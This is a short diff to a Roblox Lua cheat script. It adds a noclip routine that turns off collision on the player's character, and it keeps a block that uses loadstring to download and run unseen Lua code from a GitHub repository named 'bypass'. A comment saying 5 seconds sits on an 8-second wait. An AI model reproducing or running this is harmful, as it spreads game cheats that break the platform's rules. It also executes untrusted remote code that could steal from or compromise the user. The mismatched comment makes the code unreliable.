@@ -1,4 +1,19 @@
 task.spawn(function()
+    wait(8) -- Waits 5 seconds before executing
+
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    for _, part in pairs(character:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = false -- Disables collision so you can pass through walls/ground
+        end
+    end
+end)
+
+
+
+task.spawn(function()
     wait(10)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/fjruie/bypass.github.io/refs/heads/main/ringta.lua"))()
 end)
